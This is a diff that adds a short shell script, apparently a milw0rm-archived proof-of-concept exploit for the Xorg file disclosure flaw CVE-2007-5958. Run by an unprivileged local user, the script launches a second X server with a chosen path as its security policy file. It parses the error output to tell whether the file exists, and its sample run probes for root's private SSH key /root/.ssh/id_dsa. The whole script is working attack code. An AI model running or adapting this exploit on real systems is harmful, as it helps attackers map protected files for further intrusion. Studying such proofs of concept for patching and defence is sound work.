@@ -1,0 +1,42 @@
+#!/bin/sh
+# Xorg file disclosure vulnerability (CVE-2007-5958)
+#
+# Lame xploit by vl4dZ :))
+#
+# sh-3.1$ whoami
+# uid=1001(kecos) gid=1001(user) groups=1001(user)
+# sh-3.1$ ./Xorg-File-Existence-PoC.sh /root/.ssh/id_dsa
+# ...
+# *** FILE /root/.ssh/id_dsa EXIST !! ***
+
+# Vulnerable: xorg-server <= 1.1.1-48.13
+
+X_EXEC=/usr/bin/X
+TMP_FILE=/tmp/X.$$
+
+if [ "$1" = "" ]; then
+   echo "usage: $0 <file>"
+   exit 1
+fi
+
+[ -f ${X_EXEC} ] || (echo "${X_EXEC} not found"; exit 1)
+
+echo -e "\n** Xorg file disclosure vulnerability PoC (CVE-2007-5958) **\n"
+echo "A second X server is going to be started, once started, type the "
+echo "ctrl+Alt+Backspace sequence and you'll see the result of your request."
+echo -en "\nType [Enter] to start: "; read
+
+LANG=c ${X_EXEC} :1 -ac -sp $1 2> ${TMP_FILE}
+
+grep "error opening security policy file" ${TMP_FILE} >/dev/null
+if [ $? != 0 ]; then
+   echo "*** FILE $1 EXIST !! ***"
+else
+   echo "*** FILE $1 DOES NOT EXIST !! ***"
+fi
+rm -f ${TMP_FILE}
+
+echo -e "\nCtrl-C to quit."
+sleep 500
+
+# milw0rm.com [2008-02-19]
